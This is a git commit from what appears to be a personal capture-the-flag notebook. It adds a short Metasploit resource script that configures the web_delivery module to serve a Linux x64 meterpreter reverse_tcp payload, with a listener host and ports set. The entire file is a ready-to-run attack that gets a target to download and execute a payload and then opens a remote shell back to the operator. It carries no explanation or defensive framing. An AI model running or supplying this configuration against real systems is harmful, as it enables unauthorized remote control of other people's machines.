6bae96df1d4222858ac0c7af64da9897ef2d1c0c
wgf4242_notebook <wgf4242@gmail.com>
2023-07-21 15:53:56 +0800

    sync

---
+++ docs/ctf/scripts/realworld/msf_web_linux_rev_x64.sh
@@ -0,0 +1,8 @@
+use exploit/multi/script/web_delivery
+set target 7 # linux
+set payload linux/x64/meterpreter/reverse_tcp
+set srvport 2127
+set lhost 124.x.x.x
+set srvhost 0.0.0.0
+set lport 2126
+run
